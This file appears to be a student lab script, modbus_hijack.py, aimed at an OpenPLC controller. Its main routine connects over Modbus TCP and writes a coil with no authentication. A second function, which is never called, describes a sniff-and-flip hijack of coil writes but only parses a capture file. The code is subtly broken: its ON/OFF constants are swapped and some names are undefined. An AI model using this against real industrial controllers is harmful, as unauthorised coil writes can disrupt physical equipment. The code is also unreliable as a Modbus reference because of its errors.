#!/usr/bin/env python3
"""
file:       modbus_hijack.py
author:     Chris Tremblay <cst1465@rit.edu>
language:   Python3
date:       02/09/2023, National Pizza Day!
description:
    This reads and writes to a coil
"""

import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from scapy.all import *
import struct

PCAP_FILE_PATH = ""
OPEN_PLC_IP = "192.168.1.35"

# MODBUS function code
FC_READ_COIL    = 1
FC_DISCREET_IN  = 2
FC_SINGLE_COIL  = 5

# MODBUS output values
OUT_ON = 0x0000
OUT_OFF = 0xFF00

# address of modbus device
OPENPLC_ADDR = "192.168.1.35"
OPENPLC_PORT = 502
IX100_0 = 800
IX100_1 = 801
IX100_2 = 802
IX100_3 = 803
IX100_4 = 804
IX100_5 = 805
IX100_6 = 806
IX100_7 = 807

# packet filter 
FILTER = "host %s and port 502" % OPEN_PLC_IP # filter by plc host and mbtcp port

def packet_handler( packet ):
    """
    description:
        the function that handles what to do with a packet
    parameters:
        packet -> the packet recieved
    """
    print( "in packet handler" )
    print( packet.summary() )
    return

def modbus_hijack():
    """
    description:
        The modbus hijack attack
        starts sniffing for packets and when a write coil modbus
        packet is found, it will change the value to be the opposite
        (on -> off, off -> on) and forward it 
    """
    # init logging
    logging.basicConfig( level=LOGGING_LEVEL )

    # sniff time
    pkts = sniff( offline="modbus.pcap", handler=packet_handler, filter=FILTER )
    for pkt in pkts:
        print( "summary:", pkt.summary() )
        try:
            trans_id, proto_id, length, unit_id,func_code, = \
                struct.unpack( "!HHHBB", pkt[Raw].load[:8] )

            if( func_code == FC_SINGLE_COIL ):
                pkt.show()
                out_addr, out_val = struct.unpack( "!HH", pkt[Raw].load[8:13] )
                print( "trans_id", trans_id )
                print( "proto_id:", proto_id )
                print( "length:", length )
                print( "unit_id:", unit_id )
                print( "func_code:", func_code )    
                print( "out_addr:", out_addr )
                print( "out_val:", hex( out_val ) )
        except Exception as e:
            pass
    return

def main():
    """
    description:
        the driver function 
    """
    # connect to PLC
    client = ModbusClient( OPENPLC_ADDR, port=OPENPLC_PORT )
    client.connect()
    print( client )

    rr = client.read_coils( IX100_0 )
    print( rr )
    for i in range( len( rr.bits ) ):
        print( rr.bits[i] )
    print()

    client.write_coil( IX100_6, True, unit=1 )
    client.read_coils( IX100_0 )
    for i in range( len( rr.bits ) ):
        print( rr.bits[i] )
    print()

    client.close()  
    return

if( __name__ == "__main__" ):
    main()
